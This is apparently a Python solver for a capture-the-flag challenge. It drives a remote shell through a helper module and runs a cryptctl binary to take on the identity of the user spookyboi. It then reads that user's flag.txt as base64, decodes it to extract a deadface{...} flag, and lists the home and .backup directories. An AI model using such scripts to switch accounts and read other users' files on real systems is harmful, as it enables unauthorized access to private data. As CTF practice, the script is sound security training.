"""cryptctl -> spookyboi -> read flag as base64 so the terminal can't mangle it."""
import asyncio
import base64
import os
import re
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import find_flags as ff  # noqa: E402
from find_flags import Shell  # noqa: E402


async def run_until(sh, cmd, timeout=30.0):
    tag = "ZQ" + uuid.uuid4().hex[:8]
    await sh.send(cmd)
    await sh.send(f"echo {tag}END")
    buf, loop = "", asyncio.get_event_loop()
    end = loop.time() + timeout
    while loop.time() < end:
        buf += await sh.read(1.0)
        if f"{tag}END" in buf:
            break
    return buf


async def body(sh):
    if not await ff.handshake_ok(sh):
        return False

    await sh.send("/opt/crypto/cryptctl")
    await sh.read(6.0)
    print("identity:", (await run_until(sh, "id")).strip()[:200], flush=True)

    raw = await run_until(sh, "base64 -w0 /home/spookyboi/flag.txt")
    # find the longest base64-looking token in the transcript
    cands = re.findall(r"[A-Za-z0-9+/]{16,}={0,2}", raw)
    best = max(cands, key=len) if cands else ""
    print("b64     :", best, flush=True)
    if best:
        try:
            dec = base64.b64decode(best + "=" * (-len(best) % 4))
            print("DECODED :", dec, flush=True)
            m = re.search(rb"deadface\{[^}]+\}", dec)
            if m:
                print("\n>>> FLAG:", m.group().decode(), flush=True)
        except Exception as e:
            print("decode failed:", e, flush=True)

    # also grab the sibling artefacts while we're this identity
    print("\n", (await run_until(sh, "ls -la /home/spookyboi/ /home/spookyboi/.backup 2>/dev/null")).strip()[:600], flush=True)
    return True


async def main():
    for attempt in range(1, 8):
        try:
            async with Shell() as sh:
                if await body(sh):
                    return
                raise RuntimeError("silent")
        except Exception as e:
            print(f"[attempt {attempt}] {type(e).__name__}", flush=True)
            await asyncio.sleep(5)
    print("[!] failed", flush=True)


asyncio.run(main())
